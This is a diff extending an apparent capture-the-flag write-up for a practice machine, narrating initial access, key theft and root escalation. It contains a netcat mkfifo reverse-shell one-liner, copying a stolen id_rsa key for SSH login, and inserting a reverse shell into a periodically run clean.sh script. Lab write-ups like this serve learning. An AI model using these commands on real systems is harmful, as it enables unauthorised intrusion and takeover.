@@ -24,3 +24,18 @@ Reading the note I read that we should connect to port 4420, and that the passwo
 ![Screenshot 2025-03-26 214642](https://github.com/user-attachments/assets/2517ab15-8f22-4bca-804b-3da5130353cb)
 
 I then used `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MACHINE-IP 4444 >/tmp/f` to create a reverse shell because the CD command didn't work. 
+
+After getting a reverse shell into the system I looked around a bit and found an executable called runme. The only issue is, it was password protected. Luckily though, I was able to find the password by using cat to look at the file. 
+
+![Screenshot 2025-03-26 221622](https://github.com/user-attachments/assets/078876b3-a898-43d0-8809-3576ae433a05)
+
+After entering in the password, I ran ls again to find that id_rsa was now in my current directory. I read the file, then copied and pasted it into a new id_rsa file on my host linux system so I could ssh into the system. I ran `ssh catlover@<MACHINE-IP> -i id_rsa`. I also made sure to run `chmod 600 id_rsa` before running that command because ssh gets weird about permissions if you don't.
+
+![Screenshot 2025-03-26 221836](https://github.com/user-attachments/assets/e091f557-ab36-4b95-8049-aeb0954ec2ee)
+
+From this point I was able to find flag.txt in the root directory
+
+To find the root flag I read the bash history and found that the shell cleans temporary files on the system. From here, I wanted to try to launch a shell onto clean.sh. I ran `nano /opt/clean/clean.sh` and added a reverse shell from pentestmonkey, because I knew this ran all the time, I only had to wait a little bit for the shell to launch, where I found root.txt.
+
+
+![Screenshot 2025-03-26 223554](https://github.com/user-attachments/assets/34005d4f-89fd-46cc-a415-4e61c3566dc6)
